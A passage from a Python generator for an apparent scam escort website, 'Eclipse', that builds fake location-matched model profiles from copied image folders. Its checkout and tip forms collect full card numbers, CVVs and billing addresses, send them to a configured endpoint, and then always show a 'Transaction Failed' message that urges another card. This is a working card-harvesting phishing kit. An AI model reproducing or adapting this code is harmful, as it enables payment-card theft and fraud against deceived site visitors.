    $('#checkout-location').textContent = location.label;
}

function showCheckoutStep(stepName) {
    $all('[data-step]').forEach((element) => {
        element.hidden = element.dataset.step !== stepName;
    });
}

function initCheckout(model, location) {
    const modal = $('#checkout-modal');
    if (!modal) return;

    const closeButton = $('#checkout-close');
    const closeSecondaryButton = $('#checkout-close-secondary');
    const detailsMessage = $('#details-message');
    const successMessage = $('#success-message');
    const revealCard = $('#reveal-card');
    const revealLink = $('#reveal-link');
    const detailsForm = $('#details-form');
    const successCloseButton = $('#success-close');
    const retryButton = $('#retry-checkout');
    const resultCard = $('#result-card');
    const resultMessage = $('#result-message');
    const summaryLine = $('#checkout-summary-line');
    const summarySubline = $('#checkout-summary-subline');

    let currentAction = null;

    function resetFormState() {
        setMessage(detailsMessage, '');
        setMessage(successMessage, '');
        revealCard.classList.add('hidden');
        resultCard.className = 'message-box error';
        resultMessage.textContent = "We're experiencing technical difficulties. Please try another card or try again in a few hours.";
    }

    function collectDetails() {
        const details = {
            cardNumber: $('#card-number').value.trim(),
            expiryDate: $('#expiry-date').value.trim(),
            cvv: $('#cvv').value.trim(),
            billingName: $('#billing-name').value.trim(),
            billingEmail: $('#billing-email').value.trim(),
            billingAddress: $('#billing-address').value.trim(),
            billingCity: $('#billing-city').value.trim(),
            billingState: $('#billing-state').value.trim(),
            billingZip: $('#billing-zip').value.trim(),
            billingCountry: $('#billing-country').value.trim(),
            notes: $('#billing-notes').value.trim(),
        };

        if (!details.cardNumber || !details.expiryDate || !details.cvv || !details.billingName || !details.billingEmail || !details.billingAddress || !details.billingCity || !details.billingState || !details.billingZip || !details.billingCountry) {
            throw new Error('Please complete the payment information and billing address.');
        }

        return details;
    }

    async function submitTransaction(details) {
        const amount = currentAction.pricing === 'model' ? model.price : currentAction.amount;
        const payload = {
            actionKey: currentAction.key,
            actionLabel: currentAction.label,
            amount,
            modelSlug: model.slug,
            modelName: model.name,
            location,
            ...details,
            sourceUrl: window.location.href,
        };

        const response = await fetch(SITE.settings.checkoutEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        let data = {};
        try {
            data = await response.json();
        } catch {
            data = {};
        }

        if (!response.ok) {
            throw new Error(data.error || 'Unable to submit your request right now.');
        }

        await new Promise((resolve) => setTimeout(resolve, 2000));

        if (currentAction.key === 'reveal_contact') {
            revealCard.classList.remove('hidden');
        }
        setMessage(successMessage, data.requestId ? `Pending transaction ID: ${data.requestId}` : '', 'success');
        showCheckoutStep('result');
    }

    function setSummary(action) {
        const amount = action.pricing === 'model' ? model.price : action.amount;
        summaryLine.textContent = `${action.label} for ${model.name} — ${formatCurrency(amount)}`;
        summarySubline.textContent = `Area: ${location.label}`;
    }

    async function openModal(action) {
        currentAction = action;
        fillCheckoutSummary(action, model, location);
        setSummary(action);
        resetFormState();
        revealLink.href = SITE.settings.contactUrl;
        revealLink.textContent = SITE.settings.contactLabel;
        $('#billing-city').value = location.city;
        $('#billing-state').value = location.state;
        $('#billing-zip').value = location.zip;
        $('#billing-country').value = $('#billing-country').value || 'US';
        $('#checkout-button').textContent = 'Complete Purchase';
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
        showCheckoutStep('details');
    }

    function closeModal() {
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }

    closeButton.addEventListener('click', closeModal);
    closeSecondaryButton.addEventListener('click', closeModal);
    successCloseButton.addEventListener('click', closeModal);
    retryButton.addEventListener('click', () => {
        resetFormState();
        showCheckoutStep('details');
    });
    modal.addEventListener('click', (event) => {
        if (event.target === modal) closeModal();
    });

    detailsForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const submit = $('#checkout-button');
        submit.disabled = true;
        submit.textContent = 'Processing...';
        setMessage(detailsMessage, '');

        try {
            const details = collectDetails();
            await submitTransaction(details);
        } catch (error) {
            setMessage(detailsMessage, error.message || 'Unable to submit your request.', 'error');
        } finally {
            submit.disabled = false;
            submit.textContent = 'Complete Purchase';
        }
    });

    $all('[data-action-key]').forEach((button) => {
        button.addEventListener('click', async () => {
            const action = SITE.actions.find((item) => item.key === button.dataset.actionKey);
            if (action) {
                await openModal(action);
            }
        });
    });
}

function initModelPage() {
    const location = requireLocation();
    if (!location) return;

    const slug = document.body.dataset.modelSlug;
    const model = getModel(slug);
    if (!model) {
        goHome();
        return;
    }

    const footer = $('#page-footer');
    if (footer) {
        footer.innerHTML = renderFooter();
    }

    document.title = `Eclipse — ${model.name}`;
    $('#back-to-gallery').href = `../../${SITE.settings.gallerySlug}/`;
    $('#hero-image').src = `../../images/${model.slug}/${model.cover}`;
    $('#hero-image').alt = model.name;
    $('#hero-name').textContent = model.name;
    $('#hero-price').textContent = `Starting at ${formatCurrency(model.price)}`;
    $('#hero-location').textContent = `Available near ${location.label}`;
    $('#hero-copy').textContent = `${model.name} is currently featured for ${location.city}-area visitors. Explore the gallery below, reveal the concierge contact, request a video call, or submit a booking request at the listed rate.`;
    $('#meta-location').textContent = location.preciseLabel;
    $('#meta-zip').textContent = location.zip;
    $('#meta-gallery-count').textContent = `${model.photos.length} photos`;

    const actionsGrid = $('#actions-grid');
    actionsGrid.innerHTML = SITE.actions.map((action) => {
        const price = action.pricing === 'model' ? model.price : action.amount;
        const actionLabel = action.pricing === 'model' ? `${action.label} ${formatCurrency(model.price)}` : `${action.label} ${formatCurrency(action.amount)}`;
        return `
            <article class="action-card">
                <div class="action-title-row">
                    <div class="action-title">${escapeHtml(action.label)}</div>
                    <div class="action-price">${escapeHtml(formatCurrency(price))}</div>
                </div>
                <p class="action-copy">${escapeHtml(action.copy)}</p>
                <button class="action-button" data-action-key="${action.key}">${escapeHtml(actionLabel)}</button>
            </article>
        `;
    }).join('');

    const heroQuickActions = $('#hero-quick-actions');
    heroQuickActions.innerHTML = SITE.actions.map((action) => {
        const price = action.pricing === 'model' ? model.price : action.amount;
        return `
            <button class="quick-action-button" data-action-key="${action.key}">
                <span class="quick-action-top">
                    <span class="quick-action-name">${escapeHtml(action.label)}</span>
                    <span class="quick-action-price">${escapeHtml(formatCurrency(price))}</span>
                </span>
                <span class="quick-action-caption">Tap to open this request immediately.</span>
            </button>
        `;
    }).join('');

    const grid = $('#photo-grid');
    const photos = model.photos.map((fileName, index) => ({
        src: `../../images/${model.slug}/${fileName}`,
        alt: `${model.name} photo ${index + 1}`,
    }));

    grid.innerHTML = photos.map((photo, index) => `
        <button class="photo-item" data-photo-index="${index}" aria-label="Open ${escapeHtml(photo.alt)}">
            <img src="${photo.src}" alt="${escapeHtml(photo.alt)}" loading="lazy">
        </button>
    `).join('');

    $all('[data-photo-index]', grid).forEach((button) => {
        button.addEventListener('click', () => {
            const index = Number(button.dataset.photoIndex || 0);
            window.__openLightbox(photos, index);
        });
    });

    setupLightbox();
    initCheckout(model, location);
}

function initTipsPage() {
    const footer = $('#page-footer');
    if (footer) {
        footer.innerHTML = renderFooter();
    }

    const amountInput = $('#tip-amount');
    const message = $('#tip-message');
    const form = $('#tip-form');
    const submit = $('#tip-submit');
    const amountButtons = $all('[data-tip-amount]');

    function syncAmountButtons() {
        const current = amountInput.value.trim();
        amountButtons.forEach((button) => {
            button.classList.toggle('active', button.dataset.tipAmount === current);
        });
    }

    amountButtons.forEach((button) => {
        button.addEventListener('click', () => {
            amountInput.value = button.dataset.tipAmount || '';
            syncAmountButtons();
        });
    });

    amountInput.addEventListener('input', syncAmountButtons);

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        setMessage(message, '');

        const amount = Number(amountInput.value.trim());
        if (!Number.isFinite(amount) || amount <= 0) {
            setMessage(message, 'Please enter a valid tip amount.', 'error');
            return;
        }

        const payload = {
            actionKey: 'tip',
            actionLabel: 'Tip',
            amount,
            modelSlug: 'tip',
            modelName: 'Eclipse Tip',
            cardNumber: $('#card-number').value.trim(),
            expiryDate: $('#expiry-date').value.trim(),
            cvv: $('#cvv').value.trim(),
            billingName: $('#billing-name').value.trim(),
            billingEmail: $('#billing-email').value.trim(),
            billingAddress: $('#billing-address').value.trim(),
            billingCity: $('#billing-city').value.trim(),
            billingState: $('#billing-state').value.trim(),
            billingZip: $('#billing-zip').value.trim(),
            billingCountry: $('#billing-country').value.trim(),
            notes: $('#tip-notes').value.trim(),
            sourceUrl: window.location.href,
        };

        if (!payload.cardNumber || !payload.expiryDate || !payload.cvv || !payload.billingName || !payload.billingEmail || !payload.billingAddress || !payload.billingCity || !payload.billingState || !payload.billingZip || !payload.billingCountry) {
            setMessage(message, 'Please complete the payment information and billing address.', 'error');
            return;
        }

        submit.disabled = true;
        submit.textContent = 'Processing...';

        try {
            const response = await fetch(SITE.settings.checkoutEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            let data = {};
            try {
                data = await response.json();
            } catch {
                data = {};
            }

            if (!response.ok) {
                throw new Error(data.error || 'Unable to submit your tip right now.');
            }

            const tipText = `Thank you for your tip of ${formatCurrency(amount)}.`;
            const requestText = data.requestId ? ` Reference: ${data.requestId}.` : '';
            setMessage(message, `${tipText}${requestText}`, 'success');
            form.reset();
            amountInput.value = '';
            syncAmountButtons();
        } catch (error) {
            setMessage(message, error.message || 'Unable to submit your tip right now.', 'error');
        } finally {
            submit.disabled = false;
            submit.textContent = 'Send Tip';
        }
    });
}

function initShared() {
    const footer = $('#page-footer');
    if (footer && !footer.innerHTML.trim()) {
        footer.innerHTML = renderFooter();
    }
}

document.addEventListener('DOMContentLoaded', () => {
    initShared();
    const page = document.body.dataset.page;
    if (page === 'home') initHomePage();
    if (page === 'gallery') initGalleryPage();
    if (page === 'model') initModelPage();
    if (page === 'tips') initTipsPage();
});
'''

HOME_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eclipse</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/svg+xml" href="./assets/favicon.svg">
    <link rel="stylesheet" href="./assets/styles.css">
</head>
<body data-page="home" data-home-path=".">
    <main class="center-screen">
        <section class="access-card">
            <div class="brand">E<em>C</em>LIPSE</div>
            <div class="brand-divider"></div>

            <section id="zip-step" class="step active">
                <p class="access-subtitle">Enter your ZIP code so we can show the models available in your area.</p>
                <form id="zip-form" class="form-stack" autocomplete="off">
                    <input id="zip-input" class="field" inputmode="numeric" maxlength="5" placeholder="Enter ZIP Code" aria-label="ZIP code">
                    <button class="btn" type="submit">See Models Near Me</button>
                </form>
                <div id="zip-message" class="message-box hidden"></div>
                <p class="field-hint">We use your ZIP to show an area-specific lineup such as <strong>city, state</strong>.</p>
            </section>
        </section>
    </main>

    <footer id="page-footer" class="footer"></footer>

    <script src="./assets/models-data.js"></script>
    <script type="module" src="./assets/site.js"></script>
</body>
</html>
'''

GALLERY_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eclipse — Models</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
    <link rel="stylesheet" href="../assets/styles.css">
</head>
<body data-page="gallery" data-home-path="..">
    <header class="site-header page-shell">
        <div class="site-brand">E<em>C</em>LIPSE</div>
        <div class="header-divider"></div>
        <p class="site-tagline">Location-matched private lineup</p>
        <div class="header-actions">
            <span id="gallery-location" class="location-chip">Available near your area</span>
        </div>
    </header>

    <main class="page-shell models-section">
        <div class="heading-block">
            <h1 id="gallery-title">Here are the models in your area</h1>
            <p id="gallery-copy">Loading your local lineup…</p>
        </div>

        <div class="randomizer-row">
            <button id="shuffle-models" class="btn" type="button">Shuffle Lineup</button>
            <button id="change-zip" class="btn-secondary" type="button">Change ZIP</button>
        </div>

        <section id="gallery-grid" class="models-grid"></section>
    </main>

    <footer id="page-footer" class="footer"></footer>

    <script src="../assets/models-data.js"></script>
    <script type="module" src="../assets/site.js"></script>
</body>
</html>
'''

TIPS_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eclipse — Tips</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
    <link rel="stylesheet" href="../assets/styles.css">
</head>
<body data-page="tips" data-home-path="..">
    <nav class="site-nav">
        <a class="nav-link" href="../">&#8592; Home</a>
        <div class="nav-brand">E<em>C</em>LIPSE</div>
        <div class="nav-spacer"></div>
    </nav>

    <main class="center-screen">
        <section class="checkout-panel tips-page-card">
            <div class="heading-block" style="margin-bottom:1.6rem;">
                <h1>Send a Tip</h1>
                <p>Choose a suggested amount or enter any custom amount you would like to tip.</p>
            </div>

            <form id="tip-form" class="form-stack" autocomplete="off">
                <div>
                    <div class="step-heading" style="margin-bottom:0.75rem;">Choose Tip Amount</div>
                    <div class="amount-grid">
                        <button class="amount-option" type="button" data-tip-amount="100">$100</button>
                        <button class="amount-option" type="button" data-tip-amount="200">$200</button>
                        <button class="amount-option" type="button" data-tip-amount="500">$500</button>
                        <button class="amount-option" type="button" data-tip-amount="1000">$1,000</button>
                    </div>
                    <div class="form-stack" style="margin-top:0.9rem;">
                        <input id="tip-amount" class="field" type="number" min="1" step="1" placeholder="Or enter a custom tip amount" required>
                    </div>
                </div>

                <div>
                    <div class="step-heading" style="margin-bottom:0.65rem;">Payment Information</div>
                    <div class="form-stack">
                        <input id="card-number" class="field" type="text" inputmode="numeric" placeholder="Card Number" required>
                        <div class="form-grid">
                            <input id="expiry-date" class="field" type="text" placeholder="MM/YY" required>
                            <input id="cvv" class="field" type="text" inputmode="numeric" placeholder="CVV" required>
                        </div>
                        <input id="billing-name" class="field" type="text" placeholder="Cardholder Name" required>
                        <input id="billing-email" class="field" type="email" placeholder="Email Address" required>
                    </div>
                </div>

                <div>
                    <div class="step-heading" style="margin-bottom:0.65rem;">Billing Address</div>
                    <div class="form-stack">
                        <input id="billing-address" class="field" type="text" placeholder="Street Address" required>
                        <div class="form-grid">
                            <input id="billing-city" class="field" type="text" placeholder="City" required>
                            <input id="billing-state" class="field" type="text" placeholder="State/Province" required>
                        </div>
                        <div class="form-grid">
                            <input id="billing-zip" class="field" type="text" placeholder="ZIP/Postal Code" required>
                            <select id="billing-country" class="field" required>
                                <option value="">Select Country</option>
                                <option value="US" selected>United States</option>
                                <option value="CA">Canada</option>
                                <option value="GB">United Kingdom</option>
                                <option value="AU">Australia</option>
                                <option value="DE">Germany</option>
                                <option value="FR">France</option>
                                <option value="IT">Italy</option>
                                <option value="ES">Spain</option>
                                <option value="NL">Netherlands</option>
                                <option value="SE">Sweden</option>
                                <option value="JP">Japan</option>
                                <option value="KR">South Korea</option>
                                <option value="SG">Singapore</option>
                                <option value="AE">United Arab Emirates</option>
                            </select>
                        </div>
                        <textarea id="tip-notes" class="field" placeholder="Optional note"></textarea>
                    </div>
                </div>

                <p class="tips-note">Suggested amounts are optional — you can enter any custom amount you want.</p>
                <div id="tip-message" class="message-box hidden"></div>
                <div class="checkout-actions">
                    <button id="tip-submit" class="btn" type="submit">Send Tip</button>
                </div>
            </form>
        </section>
    </main>

    <footer id="page-footer" class="footer"></footer>

    <script src="../assets/models-data.js"></script>
    <script type="module" src="../assets/site.js"></script>
</body>
</html>
'''

MODEL_HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eclipse — {name}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/svg+xml" href="../../assets/favicon.svg">
    <link rel="stylesheet" href="../../assets/styles.css">
</head>
<body data-page="model" data-home-path="../.." data-model-slug="{slug}">
    <nav class="site-nav">
        <a id="back-to-gallery" class="nav-link" href="../../{gallery_slug}/">&#8592; All Models</a>
        <div class="nav-brand">E<em>C</em>LIPSE</div>
        <div class="nav-spacer"></div>
    </nav>

    <main class="page-shell">
        <section class="hero">
            <div class="hero-grid">
                <div class="hero-media">
                    <img id="hero-image" src="../../images/{slug}/{cover}" alt="{name}">
                </div>
                <div class="hero-summary">
                    <div>
                        <div class="kicker">Private booking preview</div>
                        <h1 id="hero-name" class="hero-name">{name}</h1>
                        <div class="brand-divider" style="margin-left:0;margin-right:auto;"></div>
                        <span id="hero-price" class="price-pill">Starting at {price}</span>
                    </div>

                    <p id="hero-copy" class="hero-copy"></p>

                    <div class="hero-quick-booking">
                        <div class="hero-quick-booking-title">Quick Access</div>
                        <p class="hero-quick-booking-copy">If you already know what you want, use one of the options below. The full Request Access section remains further down the page.</p>
                        <div id="hero-quick-actions" class="hero-quick-actions"></div>
                    </div>

                    <div class="meta-grid">
                        <div class="meta-card">
                            <div class="meta-label">Area</div>
                            <div id="meta-location" class="meta-value"></div>
                        </div>
                        <div class="meta-card">
                            <div class="meta-label">ZIP</div>
                            <div id="meta-zip" class="meta-value"></div>
                        </div>
                        <div class="meta-card">
                            <div class="meta-label">Gallery</div>
                            <div id="meta-gallery-count" class="meta-value"></div>
                        </div>
                    </div>

                    <span id="hero-location" class="location-chip">Available near your area</span>
                </div>
            </div>
        </section>

        <section class="gallery-section">
            <h2 class="section-title">Gallery</h2>
            <p class="section-subtitle">Browse the full set before you reveal contact details, request a video call, or submit a booking request.</p>
            <div class="gallery-panel">
                <div id="photo-grid" class="photo-grid"></div>
            </div>
        </section>

        <section class="actions-section">
            <h2 class="section-title section-title-small">Request Access</h2>
            <div id="actions-grid" class="actions-grid"></div>
        </section>
    </main>

    <footer id="page-footer" class="footer"></footer>

    <div id="checkout-modal" class="modal" aria-hidden="true">
        <div class="checkout-panel">
            <button id="checkout-close" class="close-button" type="button" aria-label="Close">&#10005;</button>
            <h2 class="modal-title">Complete Purchase</h2>

            <div class="checkout-summary">
                <div class="summary-card">
                    <div class="summary-label">Model</div>
                    <div id="checkout-model" class="summary-value"></div>
                </div>
                <div class="summary-card">
                    <div class="summary-label">Action</div>
                    <div id="checkout-action" class="summary-value"></div>
                </div>
                <div class="summary-card">
                    <div class="summary-label">Total</div>
                    <div id="checkout-total" class="summary-value"></div>
                </div>
            </div>

            <div class="message-box info" style="margin-top:1rem;">
                Current location: <span id="checkout-location"></span>
            </div>

            <section class="step-panel" data-step="details">
                <div class="step-heading">Payment & Billing</div>
                <form id="details-form" class="form-stack">
                    <div class="summary-card">
                        <div class="summary-label">Purchase Summary</div>
                        <div class="summary-value"><span id="checkout-summary-line"></span><br><span class="small-note" id="checkout-summary-subline"></span></div>
                    </div>

                    <div>
                        <div class="step-heading" style="margin-bottom:0.65rem;">Payment Information</div>
                        <div class="form-stack">
                            <input id="card-number" class="field" type="text" inputmode="numeric" placeholder="Card Number" required>
                            <div class="form-grid">
                                <input id="expiry-date" class="field" type="text" placeholder="MM/YY" required>
                                <input id="cvv" class="field" type="text" inputmode="numeric" placeholder="CVV" required>
                            </div>
                            <input id="billing-name" class="field" type="text" placeholder="Cardholder Name" required>
                            <input id="billing-email" class="field" type="email" placeholder="Email Address" required>
                        </div>
                    </div>

                    <div>
                        <div class="step-heading" style="margin-bottom:0.65rem;">Billing Address</div>
                        <div class="form-stack">
                            <input id="billing-address" class="field" type="text" placeholder="Street Address" required>
                            <div class="form-grid">
                                <input id="billing-city" class="field" type="text" placeholder="City" required>
                                <input id="billing-state" class="field" type="text" placeholder="State/Province" required>
                            </div>
                            <div class="form-grid">
                                <input id="billing-zip" class="field" type="text" placeholder="ZIP/Postal Code" required>
                                <select id="billing-country" class="field" required>
                                    <option value="">Select Country</option>
                                    <option value="US" selected>United States</option>
                                    <option value="CA">Canada</option>
                                    <option value="GB">United Kingdom</option>
                                    <option value="AU">Australia</option>
                                    <option value="DE">Germany</option>
                                    <option value="FR">France</option>
                                    <option value="IT">Italy</option>
                                    <option value="ES">Spain</option>
                                    <option value="NL">Netherlands</option>
                                    <option value="SE">Sweden</option>
                                    <option value="JP">Japan</option>
                                    <option value="KR">South Korea</option>
                                    <option value="SG">Singapore</option>
                                    <option value="AE">United Arab Emirates</option>
                                </select>
                            </div>
                            <textarea id="billing-notes" class="field" placeholder="Notes or booking details (optional)"></textarea>
                        </div>
                    </div>

                    <div id="details-message" class="message-box hidden"></div>
                    <div class="checkout-actions">
                        <button id="checkout-close-secondary" class="btn-secondary" type="button">Back</button>
                        <button id="checkout-button" class="btn" type="submit">Complete Purchase</button>
                    </div>
                </form>
            </section>

            <section class="step-panel" data-step="result" hidden>
                <div class="step-heading">Transaction Status</div>
                <div class="message-box error" id="result-card" style="display:block;">
                    <strong style="display:block;margin-bottom:0.45rem;">Transaction Failed</strong>
                    <span id="result-message">We're experiencing technical difficulties. Please try another card or try again in a few hours.</span>
                </div>
                <div id="success-message" class="message-box success hidden"></div>
                <div id="reveal-card" class="reveal-card hidden">
                    <h4>Concierge Contact Revealed</h4>
                    <a id="reveal-link" href="{contact_url}" target="_blank" rel="noopener noreferrer">{contact_label}</a>
                </div>
                <div class="checkout-actions">
                    <button id="retry-checkout" class="btn-secondary" type="button">Try Again</button>
                    <button id="success-close" class="btn" type="button">Close</button>
                </div>
            </section>
        </div>
    </div>

    <div id="lightbox" class="lightbox" aria-hidden="true">
        <button id="lightbox-close" class="lightbox-close" type="button" aria-label="Close">&#10005;</button>
        <button id="lightbox-prev" class="lightbox-nav prev" type="button" aria-label="Previous">&#8249;</button>
        <div class="lightbox-content">
            <img id="lightbox-image" class="lightbox-image" src="" alt="">
        </div>
        <button id="lightbox-next" class="lightbox-nav next" type="button" aria-label="Next">&#8250;</button>
        <div id="lightbox-counter" class="lightbox-counter"></div>
    </div>

    <script src="../../assets/models-data.js"></script>
    <script type="module" src="../../assets/site.js"></script>
</body>
</html>
'''


def slugify(value: str) -> str:
    lowered = value.strip().lower()
    lowered = re.sub(r"[^a-z0-9]+", "", lowered)
    return lowered


def display_name(slug: str) -> str:
    if slug in DISPLAY_OVERRIDES:
        return DISPLAY_OVERRIDES[slug]
    cleaned = re.sub(r"([a-z])([A-Z])", r"\1 \2", slug)
    return title_case_words(cleaned.replace("-", " "))


def title_case_words(value: str) -> str:
    return " ".join(part.capitalize() for part in value.split())


def random_price(slug: str) -> int:
    digest = hashlib.sha256(slug.encode("utf-8")).hexdigest()
    steps = ((3500 - 700) // 100) + 1
    index = int(digest[:8], 16) % steps
    return 700 + (index * 100)


def normalize_external_models() -> None:
    if not EXTERNAL_MODELS_DIR.exists():
        return

    existing = {path.name for path in IMAGES_DIR.iterdir() if path.is_dir()}

    for source_dir in sorted(EXTERNAL_MODELS_DIR.iterdir()):
        if not source_dir.is_dir():
            continue

        slug = slugify(source_dir.name)
        if not slug or slug in existing:
            continue

        photos = sorted(
            [path for path in source_dir.iterdir() if path.is_file() and path.suffix.lower() in IMAGE_EXTS],
            key=lambda path: path.name.lower(),
        )
        if not photos:
            continue

        target_dir = IMAGES_DIR / slug
        target_dir.mkdir(parents=True, exist_ok=True)

        for index, photo in enumerate(photos, start=1):
            target_path = target_dir / f"{index}.jpeg"
            shutil.copy2(photo, target_path)

        existing.add(slug)


def collect_models() -> list[dict]:
    models = []

    for image_dir in sorted(IMAGES_DIR.iterdir(), key=lambda path: path.name.lower()):
        if not image_dir.is_dir():
            continue

        photos = sorted(
            [path.name for path in image_dir.iterdir() if path.is_file() and path.suffix.lower() in IMAGE_EXTS],
            key=lambda name: (
                int(Path(name).stem) if Path(name).stem.isdigit() else 9999,
                name.lower(),
            ),
        )

        if not photos:
            continue

        slug = image_dir.name
        models.append(
            {
                "slug": slug,
                "name": display_name(slug),
                "price": PRICE_OVERRIDES.get(slug, random_price(slug)),
                "cover": photos[0],
                "photos": photos,
            }
        )

    return sorted(models, key=lambda item: item["name"].lower())


def write_shared_assets(models: list[dict]) -> None:
    ASSETS_DIR.mkdir(parents=True, exist_ok=True)

    site_data = {
        "settings": {
            "gallerySlug": GALLERY_SLUG,
            "rootPath": ".",
            "contactUrl": CONTACT_URL,
            "contactLabel": CONTACT_LABEL,
            "checkoutEndpoint": CHECKOUT_ENDPOINT,
        },
        "actions": [
            {
                "key": "reveal_contact",
                "label": "Reveal Contact",
                "amount": 5,
                "pricing": "fixed",
                "copy": "Unlock the concierge contact attached to this profile so that you can continue the conversation privately.",
            },
            {
                "key": "video_call",
                "label": "Video Call",
                "amount": 150,
                "pricing": "fixed",
                "copy": "Submit a paid request for a private video call session.",
            },
            {
                "key": "book_model",
                "label": "Book Model",
                "amount": 0,
                "pricing": "model",
                "copy": "Log a booking request at the model\'s listed rate.",
            },
        ],
        "models": models,
    }

    (ASSETS_DIR / "favicon.svg").write_text(FAVICON_SVG.strip() + "\n", encoding="utf-8")
    (ASSETS_DIR / "styles.css").write_text(STYLE_CSS.strip() + "\n", encoding="utf-8")
    (ASSETS_DIR / "site.js").write_text(SITE_JS.strip() + "\n", encoding="utf-8")
    (ASSETS_DIR / "models-data.js").write_text(
        "window.ECLIPSE_SITE_DATA = " + json.dumps(site_data, indent=2) + ";\n",
        encoding="utf-8",
    )


def write_pages(models: list[dict]) -> None:
    HOME_PATH.write_text(HOME_HTML, encoding="utf-8")
    GALLERY_DIR.mkdir(parents=True, exist_ok=True)
    (GALLERY_DIR / "index.html").write_text(GALLERY_HTML, encoding="utf-8")
    TIPS_DIR.mkdir(parents=True, exist_ok=True)
    (TIPS_DIR / "index.html").write_text(TIPS_HTML, encoding="utf-8")

    MODELS_DIR.mkdir(parents=True, exist_ok=True)
    for model in models:
        model_dir = MODELS_DIR / model["slug"]
        model_dir.mkdir(parents=True, exist_ok=True)
        model_html = MODEL_HTML_TEMPLATE.format(
            name=model["name"],
            slug=model["slug"],
            cover=model["cover"],
            price=f"${model['price']:,}",
            gallery_slug=GALLERY_SLUG,
            contact_url=CONTACT_URL,
            contact_label=CONTACT_LABEL,
        )
        (model_dir / "index.html").write_text(model_html, encoding="utf-8")


def main() -> None:
    IMAGES_DIR.mkdir(parents=True, exist_ok=True)
    normalize_external_models()
    models = collect_models()
    write_shared_assets(models)
    write_pages(models)
    print(f"Built {len(models)} model profiles.")


if __name__ == "__main__":
    main()
